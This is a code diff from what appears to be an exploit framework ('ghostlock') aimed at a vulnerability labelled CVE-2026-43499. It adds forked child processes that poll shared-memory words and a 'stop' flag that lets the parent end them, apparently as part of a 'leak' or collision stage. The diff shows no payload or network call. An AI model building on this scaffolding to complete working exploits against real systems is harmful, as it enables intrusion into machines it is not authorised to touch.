@@ -27,6 +27,7 @@
 #include <cstdint>
 
 #include "backend/cve_2026_43499/leak/collision_wait.hpp"
+#include "backend/cve_2026_43499/leak/snitch_child.hpp"
 #include "backend/cve_2026_43499/leak/snitch_region.hpp"
 #include "backend/cve_2026_43499/leak/snitch_seam.hpp"
 #include "backend/cve_2026_43499/leak/snitch_setup.hpp"
@@ -112,7 +113,12 @@ namespace ghostlock::backend::cve_2026_43499::leak {
         outcome.region_bytes = layout.total_bytes;
         auto *counter = reinterpret_cast<volatile std::uint32_t *>(
             static_cast<unsigned char *>(mapped.address) + counter_offset);
+        /* The stop word sits right after the counter, so a parent that wants its children
+         *  to leave has a way to say so that is inside the region both sides share. */
+        auto *stop = reinterpret_cast<volatile std::uint32_t *>(
+            static_cast<unsigned char *>(mapped.address) + counter_offset + sizeof(std::uint32_t));
         *counter = 0U;
+        *stop = 0U;
 
         /* The cohort: one child per collision, each of which waits on its own word. A
          *  fork that fails takes the whole attempt with it, and the children already
@@ -124,6 +130,17 @@ namespace ghostlock::backend::cve_2026_43499::leak {
         const std::size_t cohort = setup.collisions < kMaxCohort ? setup.collisions : kMaxCohort;
         for (std::size_t i = 0U; i < cohort; ++i) {
             const memory::SeamResult child = Seam::fork_child();
+            if (child.value == 0) {
+                /* In the child. It runs its own word until the parent asks it to stop, and
+                 *  then ends itself rather than returning into the caller's code. */
+                ChildArgs args{};
+                args.word = const_cast<std::uint32_t *>(words[i]);
+                args.counter = const_cast<std::uint32_t *>(counter);
+                args.stop = const_cast<std::uint32_t *>(stop);
+                args.amount = 1U;
+                child_main<Seam>(args);
+                Seam::exit_child();
+            }
             if (child.value <= 0) {
                 for (std::size_t j = 0U; j < forked; ++j) {
                     (void) Seam::stop_child(pids[j]);
@@ -155,6 +172,9 @@ namespace ghostlock::backend::cve_2026_43499::leak {
             ++round;
         }
         outcome.rounds = round;
+        /* Ask first, kill second: a child that leaves between pokes is a child that is not
+         *  holding anything when it goes. */
+        *stop = 1U;
         if (*counter >= wanted) {
             outcome.status = ScanVerdict::Poked;
         } else {
